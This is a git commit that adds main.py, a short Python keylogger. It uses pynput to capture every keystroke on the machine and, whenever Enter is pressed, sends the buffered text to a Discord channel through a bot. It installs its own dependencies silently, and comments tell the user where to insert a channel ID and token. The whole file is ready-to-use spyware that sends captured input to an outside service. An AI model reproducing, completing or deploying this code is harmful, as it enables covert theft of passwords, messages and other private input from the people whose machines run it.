7e7433522ea2c38fe6f9ca9617dd5e2d93e6bf6e
Moeefa <moeefa@protonmail.com>
2022-11-07 20:37:55 -0400

    Create main.py

---
+++ main.py
@@ -0,0 +1,34 @@
+try:
+  import discord  
+  from pynput import keyboard
+except:
+  import os
+  os.system("pip install pynput discord")
+
+intents = discord.Intents.default()
+client = discord.Client(intents=intents)
+str_msg = []
+
+def on_press(key):
+    global str_msg
+
+    try:
+        str_msg.append(key.char)
+    except AttributeError:
+        if key == keyboard.Key.backspace:
+            str_msg.pop()
+        if key == keyboard.Key.enter:
+            channel = client.get_channel(0) # Change 0 to your channel ID.
+            client.loop.create_task(channel.send(''.join(str_msg)))
+            str_msg = []
+            return
+            
+        str_msg.append(str(key.char) + " ") # Remove this line if you don't wanna log special chars.
+
+@client.event
+async def on_ready():
+    print(f"Logged in as {client.user}")
+
+with keyboard.Listener(on_press=on_press) as listener:
+    client.run("TOKEN") # Change token.
+    listener.join()
